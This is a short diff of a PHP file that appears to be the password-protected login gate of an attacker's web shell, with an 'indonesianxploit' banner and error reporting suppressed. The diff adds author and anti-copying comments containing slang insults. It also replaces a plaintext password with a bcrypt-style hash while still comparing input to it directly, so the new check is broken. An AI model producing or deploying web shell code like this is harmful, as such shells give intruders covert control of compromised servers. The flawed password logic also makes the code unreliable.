@@ -1,13 +1,17 @@
 <?php
+// Author yourdre4m7
+// Recode? nub anjeng wkwkkw
+// recode izin ya kimak
+
 error_reporting(0);
 
-$password = 'dre4m1337';
+$password = '$2a$12$Be9RmgOuASk1d.79i35z9u86BuLMNOcSw9wY80rnG/0GC.CIwIPPu'; // password
 session_start();
 if (!isset($_SESSION['logged_in']) && (!isset($_POST['pass']) || $_POST['pass'] !== $password)) {
     echo '<center>
 	<pre>
  ___________________________
-< root@indonesianxploit:~# w00t??? >
+< root@indonesianxploit~yourdre4m7 >
  ---------------------------
 	</pre><form method="post"><input type="password" name="pass"><button type="submit">Login</button></form></center>';
     exit;
